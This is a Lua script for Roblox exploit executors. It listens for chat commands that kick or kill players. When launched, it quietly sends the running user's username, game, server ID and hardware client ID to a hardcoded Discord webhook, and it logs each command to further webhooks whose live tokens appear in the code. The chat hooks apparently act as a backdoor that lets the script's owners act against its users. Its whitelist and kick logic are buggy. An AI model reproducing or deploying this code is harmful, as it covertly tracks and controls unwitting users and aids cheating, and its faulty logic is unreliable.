local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local PREFIX = "/"
local SILENTPREFIX = "/e"

local WEBHOOK = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"
local EXECUTOR = identifyexecutor()
local EXECUTOR_TEXT = ""

local WHITELISTED_HWIDS = {
	"B7BF719A-88E8-4C21-8EE0-816A58F10E7F",
	"1D4ECD30-CE2F-4EB4-A493-E32E6FC25E87",
}

local function GetPlayer(Name)
	if #Name < 3 then
		return nil
	end

	Name = string.lower(Name)
	for _, player in pairs(Players:GetPlayers()) do
		if string.sub(string.lower(player.Name), 1, #Name) == Name then
			return player
		end
	end
	return nil
end

local function isWhitelisted(player)
	local hwid = RbxAnalyticsService:GetClientId()
	for _, whitelistedHwid in ipairs(WHITELISTED_HWIDS) do
		if hwid == whitelistedHwid then
			return true
		end
	end
	return false
end

local function postToWebhook(webhookUrl, embed)
	local payload = {
		["embeds"] = {embed},
	}

	local httpRequest = {
		Url = webhookUrl,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode(payload)
	}

	request(httpRequest)
end

local function getWebhookUrl(commandName)
	local webhookUrls = {
		["kick"] = "https://discord.com/api/webhooks/1265780613705633844/QeqP5mkB1rH5dYF_kTMG0Zfb6HxB8q-7rcaeEiwHTNolW4mpXrNsx5wyWWmQXXgGxq54",
		["kill"] = "https://discord.com/api/webhooks/1265780613705633844/QeqP5mkB1rH5dYF_kTMG0Zfb6HxB8q-7rcaeEiwHTNolW4mpXrNsx5wyWWmQXXgGxq54",
	}
	return webhookUrls[commandName] or WEBHOOK
end

local function kickPlayer(player, kickMessage)
	if not isWhitelisted(player) then
		return
	end
	if LocalPlayer then
		LocalPlayer:Kick(kickMessage or "kicked by tear staff ( not game staff dw )")
		return
	end
end

local function killPlayer(player, targetPlayerName)
	if not isWhitelisted(player) then
		return
	end

	local targetPlayer = GetPlayer(targetPlayerName)
	if targetPlayer then
		local character = targetPlayer.Character
		if character and character:FindFirstChild("Humanoid") then
			character.Humanoid.Health = 0
			return
		end
	end
end

local function executeCommand(player, commandName, args)
	if not isWhitelisted(player) then
		return
	end

	local ADMIN_EMBED = {
		["title"] = LocalPlayer.Name,
		["color"] = 0x2f5bc7,
		["fields"] = {
			{
				["name"] = "Executor",
				["value"] = EXECUTOR_TEXT,
				["inline"] = true
			},
			{
				["name"] = "Game",
				["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
				["inline"] = true
			},
			{
				["name"] = "JobId",
				["value"] = game.JobId,
				["inline"] = true
			},
			{
				["name"] = "Command",
				["value"] = commandName,
				["inline"] = true
			},
			{
				["name"] = "Victim",
				["value"] = args[1],
				["inline"] = true
			},
			{
				["name"] = "HWID",
				["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
				["inline"] = true
			}
		}
	}

	local webhookUrl = getWebhookUrl(commandName)
	postToWebhook(webhookUrl, ADMIN_EMBED)

	if commandName == "kick" then
		local targetName = args[1]
		local kickMessage = table.concat(args, " ", 2)
		kickPlayer(player, targetName, kickMessage)
	elseif commandName == "kill" then
		local targetName = args[1]
		killPlayer(player, targetName)
	end
end

local function onPlayerChatted(player, message)
	if message:sub(1, #SILENTPREFIX) == SILENTPREFIX then
		local args = string.split(message:sub(#SILENTPREFIX + 2), " ")
		local commandName = table.remove(args, 1)
		executeCommand(player, commandName, args)
	elseif message:sub(1, #PREFIX) == PREFIX then
		local args = string.split(message:sub(#PREFIX + 1), " ")
		local commandName = table.remove(args, 1)
		executeCommand(player, commandName, args)
	end
end

local function ConnectPlayer(player)
	player.Chatted:Connect(function(message)
		onPlayerChatted(player, message)
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	ConnectPlayer(player)
end

Players.PlayerAdded:Connect(function(player)
	ConnectPlayer(player)
end)

if EXECUTOR == "Wave" then
	EXECUTOR_TEXT = "Wave"
elseif EXECUTOR == "Solara" then
	EXECUTOR_TEXT = "Solara"
else
	EXECUTOR_TEXT = "Unknown"
end

local embed = {
	["title"] = LocalPlayer.Name,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = EXECUTOR_TEXT,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local httpRequest = {
	Url = WEBHOOK,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)
